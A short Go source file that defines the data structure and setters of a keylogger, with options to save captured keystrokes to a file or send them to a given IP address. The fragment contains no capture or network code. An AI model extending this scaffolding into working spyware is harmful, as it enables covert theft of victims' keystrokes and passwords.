package main

// represents the keylogger
type keylogger struct {
	keyPressed string

	// controls whether keystrokes are saved to a file
	saveToFile bool
	filename   string

	// controls whether keystrokes are sent over the network
	send  bool
	ipdst string
}

// gets the last pressed key of the keylogger
func (k keylogger) getKey() string {
	return "[" + k.keyPressed + "]"
}

// set keylogger to record results in given file
func (k *keylogger) setSaveToFile(filename string) {
	k.saveToFile = true
	k.send = false
	k.filename = filename
}

// set keylogger to send results to given ip destination
func (k *keylogger) setSend(ipdst string) {
	k.send = true
	k.saveToFile = false
	k.ipdst = ipdst
}
